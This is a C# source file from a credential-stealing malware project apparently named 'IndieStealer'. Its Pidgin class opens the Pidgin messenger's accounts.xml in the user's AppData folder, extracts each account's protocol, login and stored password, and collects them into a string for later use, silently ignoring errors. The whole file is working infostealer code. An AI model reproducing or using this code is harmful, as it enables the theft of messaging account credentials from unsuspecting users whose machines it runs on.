using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;

namespace IndieStealer.Collect.Messengers
{
    class Pidgin
    {
        public static string Credentials = "";
        private static string PidginPath = Info.Appdata + "\\.purple\\accounts.xml";
        public static void Collect()
        {
            if (File.Exists(PidginPath))
            {
                try
                {
                    var xs = new XmlDocument();
                    xs.Load(new XmlTextReader(PidginPath));
                    foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                    {
                        var protocol = nl.ChildNodes[0].InnerText;
                        var login = nl.ChildNodes[1].InnerText;
                        var password = nl.ChildNodes[2].InnerText;
                        if (!string.IsNullOrEmpty(protocol) && !string.IsNullOrEmpty(login) && !string.IsNullOrEmpty(password))
                        {
                            Credentials += "Protocol: " + protocol;
                            Credentials += "\nLogin: " + login;
                            Credentials += "\nPassword: " + password;
                            Credentials += "\n________________________\r\n";

                        }
                    }                    
                }
                catch (Exception ex) { }
            }
        }
    }
}
